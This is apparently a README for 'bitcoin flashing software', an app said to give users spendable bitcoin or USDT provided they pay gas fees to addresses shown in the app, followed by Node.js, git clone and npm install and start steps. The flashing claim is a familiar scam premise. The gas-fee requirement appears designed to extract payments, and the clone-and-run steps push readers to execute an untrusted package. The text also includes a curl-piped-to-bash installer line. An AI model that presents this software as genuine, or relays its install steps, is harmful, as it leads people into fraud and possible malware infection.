When you gain app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.

## Prerequisites

This application requires [Node.js](https://nodejs.org) to run.

### Windows

Download the Node.js setup application [here](https://nodejs.org/en/download/).

### Linux

Run this code in terminal. You may need superuser privileges (sudo).

```sh
apt install nodejs
```

### Mac

Install Homebrew (if you don't have it). Open the terminal and run:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed, you can install Node.js by running:

```sh
brew install node
```

## Installation

1. Clone the repository:

```sh
git clone bitcoin-flashing-software/public-release
```

2. Install necessary dependencies:

```sh
npm install && npm install electron
```

## Usage

```sh
npm start
```

Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are responsible for your gas fees. You'll find corresponding gas addresses for each token type.
